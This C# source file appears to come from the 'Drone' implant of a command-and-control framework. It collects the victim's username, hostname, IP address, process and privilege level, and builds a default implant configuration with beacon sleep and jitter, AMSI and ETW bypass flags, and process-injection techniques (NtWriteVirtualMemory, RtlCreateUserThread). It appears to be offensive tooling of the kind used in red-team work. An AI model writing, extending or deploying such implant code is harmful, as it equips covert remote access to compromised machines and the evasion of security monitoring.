using System;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Security.Principal;

using Drone.Models;
using Drone.Modules;

namespace Drone
{
    public static class Utilities
    {
        public static Metadata GenerateMetadata()
        {
            var hostname = Dns.GetHostName();
            var addresses = Dns.GetHostAddresses(hostname);
            var process = Process.GetCurrentProcess();

            return new Metadata
            {
                Guid = Guid.NewGuid().ToShortGuid(),
                Username = Environment.UserName,
                Hostname = hostname,
                Address = addresses.LastOrDefault(a => a.AddressFamily == AddressFamily.InterNetwork)?.ToString(),
                Process = process.ProcessName,
                Pid = process.Id,
                Integrity = GetDroneIntegrity,
                Arch = Environment.Is64BitProcess ? Metadata.DroneArch.x64 : Metadata.DroneArch.x86
            };
        }

        private static Metadata.DroneIntegrity GetDroneIntegrity
        {
            get
            {
                var integrity = Metadata.DroneIntegrity.Medium;

                using var identity = WindowsIdentity.GetCurrent();
                if (identity.Name.Equals("SYSTEM", StringComparison.OrdinalIgnoreCase))
                    integrity = Metadata.DroneIntegrity.SYSTEM;
                else if (identity.Owner != identity.User)
                    integrity = Metadata.DroneIntegrity.High;

                return integrity;
            }
        }

        public static DroneConfig GenerateDefaultConfig()
        {
            var config = new DroneConfig();
            
            config.SetConfig("SleepInterval", GetSleepInterval);
            config.SetConfig("SleepJitter", GetSleepJitter);
            config.SetConfig("BypassAmsi", GetBypassAmsi);
            config.SetConfig("BypassEtw", GetBypassEtw);
            config.SetConfig("AllocationTechnique", GetAllocationTechnique);
            config.SetConfig("ExecutionTechnique", GetExecutionTechnique);

            return config;
        }

        public static DroneModuleDefinition MapDroneModuleDefinition(DroneModule module)
        {
            var definition = new DroneModuleDefinition
            {
                Name = module.Name
            };

            foreach (var command in module.Commands)
            {
                if (!command.Visible) continue;
                
                var commandDef = new DroneModuleDefinition.CommandDefinition
                {
                    Name = command.Name,
                    Description = command.Description
                };

                foreach (var argument in command.Arguments)
                {
                    var argumentDef = new DroneModuleDefinition.CommandDefinition.ArgumentDefinition
                    {
                        Label = argument.Label,
                        Artefact = argument.Artefact,
                        Optional = argument.Optional
                    };
                    
                    commandDef.Arguments.Add(argumentDef);
                }
                
                definition.Commands.Add(commandDef);
            }

            return definition;
        }

        private static int GetSleepInterval => int.Parse("60");
        private static int GetSleepJitter => int.Parse("10");
        private static bool GetBypassAmsi => false;
        private static bool GetBypassEtw => false;
        private static Type GetAllocationTechnique => typeof(Invocation.Injection.NtWriteVirtualMemory);
        private static Type GetExecutionTechnique => typeof(Invocation.Injection.RtlCreateUserThread);
    }
}